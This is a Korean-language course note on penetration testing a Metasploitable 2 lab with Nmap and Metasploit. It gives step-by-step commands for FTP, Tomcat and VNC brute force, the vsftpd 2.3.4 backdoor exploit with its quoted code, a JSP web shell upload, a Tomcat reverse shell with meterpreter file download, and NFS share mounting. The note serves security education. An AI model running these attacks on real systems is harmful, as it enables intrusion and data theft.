# Security EduComp - 웹 취약점 분석과 시큐어코딩

https://boanproject.notion.site/Metasploit-2168fabd169f8057841efb34e6e79617

## Nmap 포트스캔 이해 및 서비스 정보 수집

```sh
nmap -sV [ip] -p-
```
-sV: 포트의 서비스 버전까지 확인
-p-: 모든 TCP 포트(1~65535) 스캔

```
https://www.exploit-db.com
```
서비스 버전 정보별 취약점 탐색 확인 사이트

---

## 메타스플로잇 portscan을 이용한 포트 정보 수집

메타스플로잇은 **search -> use -> show** 의 과정을 거침

### search

```
msf > search portscan
```
-공격 모듈 찾아보기

```
msf > info [num]
```
-해당 모듈 넘버로 정보 조회

### use

```
msf > use [num]
```
-해당 모듈 사용

```
msf > show options
```
-옵션을 보는 방법

```
[옵션]
Delay를 거쳐 IPS의 의심을 피함.
PORTS: 1-10000
RHOSTS: Remote Hosts의 주소를 적음
THREADS: 너무 많이 사용할 경우 CPU 과부하, 정확성 떨어짐
```

```
msf > set RHOSTS [ip]
```
-RHOSTS 지정

```
msf > set THREADS 10
```
-Threads 개수 지정

```
msf > exploit
```
-툴 시작

### show

```
msf > services
```
-스캔 내용 확인

---

## FTP 버전정보 및 익명 연결 확인

```
msf > search ftp_version
```
-FTP Version 확인

```
msf > setg RHOSTS [ip]
```
-setg: global한 전역 설정

```
msf > getg RHOSTS
```
-getg: getg로 전역 설정 확인

```
msf > run
```
-메타스플로잇 실행

```
msf > serach ftp/anonymous
```
-ftp/anonymous 검색

```
msf > use [num]
```
-사용할 num 선택

```
msf > exploit
```
-exploit 시작

---

## FTP 무작위 대입 공격 및 와이어샤크 패킷 확인

```
msf > search ftp_login
```
-ftp_login과 관련된 항목 검색

Kali에는 사전 파일이 존재하기 때문에 ID, PASSWD과 관련된 항목 Brute Force 가능.

```
msf > use 0
```
-ftp_login과 관련된 항목은 1개. 즉 use 0

```
msf > set RHOSTS [ip]
```
-대상 IP로 RHOSTS 설정

```
msf > set USER_FILE [dir]
```
-사전 파일 위치 등록(user)

```
msf > set PASS_FILE [dir]
```
-사전 파일 위치 등록(password)

```
msf > set THREADS 5
```
-스레드 개수는 5개 정도가 적절

```
msf > exploit
```
-공격 진행

### Wireshark Statistics

- Statistics - Conversations: Wireshark에서 제공하는 기능 중 하나로, 두 호스트, 두 포트, 또는 두 프로토콜 간의 통신 대화(conversation)를 분석할 때 사용한다.
- Statistics - Endpoints: Wireshark에서 제공하는 기능 중 하나로, 개별 호스트(Endpoint)의 트래픽 통계를 보여준다.

msfconsole을 이용해서 FTP BruteForce 공격을 진행하게 될 시, Wireshark Statistics 기능을 이용해서 조회 가능

```
frame[offset:length] == value
```
Wireshark에서는 패킷 내 특정 위치의 바이트를 직접 비교할 수 있다.

이를 통해 "login successful"이 진행된 위치의 오프셋을 직접 조회할 수도 있음.

---

## vsFTP 2.3.4 발견된 백도어 공격

### vsftpd 2.3.4 취약점 존재

VSFTPD (Very Secure FTP Daemon)는 유닉스 계열 시스템에서 파일 전송 프로토콜(FTP)을 지원하는 경량화된 보안 FTP 서버 소프트웨어이다.

그러나 VSFTPD 버전 2.3.4에는 악의적인 백도어가 삽입된 사례가 존재한다. 이 백도어는 특정 조건을 만족하는 사용자 입력을 통해 원격에서 셸을 열 수 있도록 설계된 취약점이다.

- CVE ID: CVE-2011-2523
- 영향받는 버전: VSFTPD 2.3.4 (2011년 6월 30일 ~ 7월 1일 사이 다운로드된 vsftpd-2.3.4.tar.gz 아카이브)
- 취약점 유형: 백도어, 원격 코드 실행 (Remote Code Execution)
- 설명: 이 취약점은 VSFTPD 2.3.4의 소스 코드에 악의적으로 삽입된 백도어로, 사용자가 FTP 서버에 로그인할 때 특정 문자열(스마일리 ":)")을 사용자 이름으로 입력하면 포트 6200에서 바인드 셸(bind shell)을 열어 공격자가 루트 권한으로 시스템에 접근할 수 있게 한다.

### 취약점 원인

VSFTPD 2.3.4 백도어 취약점은 소프트웨어 자체의 설계 결함이 아니라, 공급망 공격의 결과로 발생했다. 아래는 주요 원인이다.

1. 소스 코드 위변조:
    - 2011년 6월 30일에서 7월 1일 사이, VSFTPD의 공식 다운로드 사이트에서 배포된 vsftpd-2.3.4.tar.gz 아카이브에 악의적인 코드가 삽입되었다.
    - 공격자가 VSFTPD 서버를 침투하여 정식 배포 패키지에 백도어를 추가한 것으로 추정된다. 이 백도어는 7월 3일에 발견되어 제거되었지만, 그 사이 다운로드한 사용자들이 취약한 버전을 설치했을 가능성이 있다.

2. 백도어 동작 메커니즘:
    - 백도어는 소스 코드의 str.c 파일에 삽입된 악성 코드로 구현되었다. 해당 코드는 사용자 이름 입력을 검사하여 특정 문자열(16진수 0x3A와 0x29, 즉 ASCII로 ":"와 ")")을 감지한다.
    - 이 문자열이 사용자 이름에 포함되면, vsf_sysutil_extra() 함수가 호출되어 포트 6200에서 TCP 소켓을 열고 /bin/sh 셸을 실행하는데, 이로 인해 공격자는 루트 권한으로 원격 셸에 접근할 수 있다.
    - 소스 코드 예시 (Pastebin에서 발췌):여기서 0x3a와 0x29는 스마일리 ":)"를 나타내며, 이를 감지하면 백도어가 활성화된다.

```C
else if ((p_buf[i] == 0x3a) && (p_buf[i+1] == 0x29)) {
    vsf_sysutil_extra();
}
```

### msf로 실습

```
msf > search vsftp
```
-vsftp의 취약점 항목 탐색

```
msf > use 1
```
-1번 항목 사용

```
msf > set RHOSTS [ip]
```
-RHOSTS 설정

```
msf > exploit
```
-exploit 실행

희생자 PC에 vsftp 취약점을 통해 root 권한을 탈취한 것을 확인할 수 있다.

---

## Tomcat 관리자 페이지 계정 추측 및 웹쉘 업로드

8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1

Apache Tomcat: WAS(동적인 페이지)

```sh
sudo nikto -h http://192.168.81.130:8180/
```
-Tomcat Manager 같은 페이지 등의 취약점 분석

/manager/html: 관리자 ID, PW는 Tomcat/Tomcat으로 추출됨.

관리자 페이지에서 WAR 파일을 업로드 하는 영역이 있다.

해당 페이지는 jsp 기반으로 만들어진 웹 서비스임을 확인할 수 있고,

kali의 /usr/share/webshells/jsp 경로에는 jsp 취약점을 이용해 웹 쉘을 업로드하고, 그 웹 쉘을 이용해 원격으로 쉘을 장악할 수 있는 기능이 있는 소스코드가 있다.

- cmdjsp.jsp: Linux 전용 웹 쉘 소스 코드
- jsp-reverse.jsp: Windows 전용 웹 쉘 소스 코드

두 파일을 zip -r shell.war . 명령어로 war파일 형식으로 압축을 진행한 후에

해당 페이지에서 war 파일을 업로드 한 후, Deploy를 누르면 /shell 이라고 하는 새로운 페이지가 생성되고, 해당 경로를 URL에 입력 후 

http://192.168.81.130:8180/shell/cmdjsp.jsp?cmd=

cmd 인자에 Linux 명령어를 실행하면 해당 명령어가 실행된 결과가 페이지에 나타난다.

---

## 메타스플로잇을 활용한 Tomcat 관리자 계정 무작위 대입 공격 자동화

```
msf6 > search tomcat mgr
```
-tomcat manager 페이지 대상으로 공격 진행하기 위한 툴 검색

```
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
```
-tool 선택

```
msf6 > set RHOSTS [ip]
msf6 > set RPORT [port]
msf6 > set THREADS 5
msf6 > set STOP_ON_SUCCESS true
```
-RHOSTS, RPORT, THREADS 설정 후, STOP_ON_SUCCESS는 공격이 성공한 후 정지.

```
msf6 > exploit
```
-exploit 시작

```
tomcat:tomcat
```
이라는 ID:PW를 확인할 수 있음.

---

## 메타스플로잇을 활용한 Tomcat 시스템 침투 및 리버스 공격

공격도구: search시, exploit으로 시작한다.

```
msf6 > use exploit/multi/http/tomcat_mgr_deploy
```
-공격 도구 설정

show options시, LHOST, LPORT와 같은 Listening 옵션 설정해야 함.

```
msf6 > set HttpUsername tomcat
msf6 > set HttpPassword tomcat
msf6 > set RHOSTS [대상 ip]
msf6 > set RPORT [대상 port]
msf6 > exploit
```
-설정 후, exploit 시작

Server username: tomcat55

```
Started reverse TCP handler on [ip:port]
Uploading 6217 bytes as WeEGsVHbviKTZ.war ...
Executing /WeEGsVHbviKTZ/oSAFmO.jsp ...
Undeploying WeEGsVHbviKTZ.war ...
```
-msf는 RCE를 통해 Tomcat mgr 페이지에 war파일을 업로드, 그 안에 있는 jsp 코드를 실행시킨 뒤, 흔적을 제거하는 과정을 수행한다.
- 공격자는 tomcat mgr 페이지에 RCE 접근이 가능함.
- 리눅스 명령어와 비슷한 명령어들을 수행 가능함. (search 같은 명령어들도 사용 가능.)

```
meterpreter > search -f *.txt
```
-.txt로 된 파일들 전부 찾는 명령어

```
meterpreter > download /var/www/twiki/readme.txt
```
-서버에 있는 파일을 로컬(C2 서버)로 download 가능.

---

## 메타스플로잇을 활용한 VNC 무작위 대입공격 원격 접속 성공

**VNC란?**

- VNC(Virtual Network Computing):
    - 원격 데스크톱 접속을 위한 프로토콜 및 소프트웨어.
    - 클라이언트와 서버 간 그래픽 사용자 인터페이스(GUI)를 공유하여 원격 시스템 제어 가능.
    - 기본 포트: 5900/TCP (표준 VNC 포트, 디스플레이 번호에 따라 5901, 5902 등 사용).
    - 대표적인 구현: TightVNC, UltraVNC, RealVNC.
- 동작 원리:
    - VNC 서버가 원격 시스템에서 실행되며, 클라이언트가 접속하여 화면, 키보드, 마우스 입력을 전송.
    - 인증 방식: 비밀번호 기반 (기본적으로 약한 암호화 또는 비암호화).
- 사용 사례:
    - IT 관리, 원격 지원, 서버 관리.
 
**VNC의 보안 취약점**

- 취약점 유형:
    1. 약한 비밀번호:
        - 기본 비밀번호(null, 빈 비밀번호) 또는 쉽게 추측 가능한 비밀번호 사용.
        - Metasploitable 2의 VNC는 기본적으로 비밀번호가 취약하거나 설정되지 않은 경우가 많음.
    2. 브루트 포스 공격:
        - VNC 인증이 비밀번호 기반이므로 무차별 대입 공격에 취약.
    3. 구형 VNC 버전:
        - 오래된 VNC 소프트웨어는 알려진 취약점(CVE)을 포함.
        - 예: CVE-2006-2369 (RealVNC 인증 우회 취약점).
    4. 암호화 부족:
        - 기본 VNC는 데이터 전송 시 암호화가 약하거나 없음(스니핑 가능).
    5. 구성 오류:
        - 방화벽 설정 미흡, 불필요한 VNC 서비스 노출.

```
msf6 > use auxiliary(scanner/vnc/vnc_login)
```
-vnc 툴 사용

```
msf6 > set RHOSTS [ip]
msf6 > set THREADS 5
msf6 > exploit
```
-설정 후, exploit

```shell
sudo vncviewer
```

vnc server의 비밀번호를 입력하면 GUI 환경에서 원격으로 metasploitable Shell 사용 가능

---

## NFS 취약점 탐색 및 원격 접속 사례

**NFS란?**

- NFS(Network File System):
    - 네트워크를 통해 원격 시스템의 파일 시스템을 로컬처럼 마운트하여 접근 가능하게 하는 프로토콜.
    - 주로 유닉스/리눅스 환경에서 사용.
    - 기본 포트: 2049/TCP (NFS 데몬), 111/TCP (rpcbind/portmapper).
    - 개발: Sun Microsystems (1984년).
- 동작 원리:
    - NFS 서버가 파일 시스템 디렉토리를 내보내기(export) 설정.
    - 클라이언트가 해당 디렉토리를 마운트하여 파일 읽기/쓰기 가능.
    - 인증: 기본적으로 UID/GID 기반 (IP 또는 호스트 기반 접근 제어).
- 사용 사례:
    - 공유 파일 시스템, 데이터 백업, 분산 컴퓨팅 환경.

**NFS의 보안 취약점**

- 취약점 유형:
    1. 잘못된 내보내기 설정:
        - NFS 서버가 루트 디렉토리(/) 또는 민감한 디렉토리를 모든 클라이언트(*)에 내보내기.
        - 읽기/쓰기 권한(rw) 부여 시 파일 수정 가능.
        - Metasploitable 2는 /tmp 또는 /home 디렉토리를 제한 없이 내보내기.
    2. 루트 스쿼시(root_squash) 비활성화:
        - no_root_squash 설정 시 클라이언트의 루트 사용자가 서버의 루트 권한으로 파일 접근 가능.
        - 공격자가 루트 권한으로 악성 파일 업로드 가능.
    3. 약한 인증:
        - NFS는 기본적으로 IP 기반 인증 사용 (스푸핑 가능).
        - Kerberos 등 강력한 인증 미적용 시 취약.
    4. 구형 NFS 버전:
        - NFSv2/v3은 암호화 부족, 알려진 취약점 포함 (예: CVE-1999-0548, NFS 익스플로잇).
    5. rpcbind 취약점:
        - 포트 111에서 실행되는 rpcbind 서비스가 NFS 관련 정보 노출.
- Metasploitable 2의 NFS 취약점:
    - NFS 서버가 /tmp 디렉토리를 no_root_squash와 *로 내보내기.
    - 공격자가 마운트 후 임의 파일 업로드 및 실행 가능.
    - 익스플로잇 가능한 모듈: Metasploit의 auxiliary/scanner/nfs/nfsmount.
 
```
msf6 > use auxiliary(scanner/nfs/nsfmount)
```
-nfs 툴 사용

```
msf6 > set RHOSTS [ip]
msf6 > exploit
```
-설정 후, exploit

```shell
sudo showmount -e [ip]
```

```
sudo mkdir /mnt/nfs_test
```

```shell
sudo mount -t nfs [ip]:/tmp /mnt/nfs_test
```
-mkdir로 단순히 nfs_test 폴더만 만들었음.
-그런데 디렉터리를 확인해보면 파일이 들어와 있는 것을 확인할 수 있음.
-mount를 통해 원격으로 파일을 받아옴

1. 원격으로 접속해 내부 시스템 정찰 가능
2. 원격으로 접속한 자산에서 또 다른 자산 연동 접점 확인 & 백도어 설치 가능

---

## webdav 취약점 분석 사례

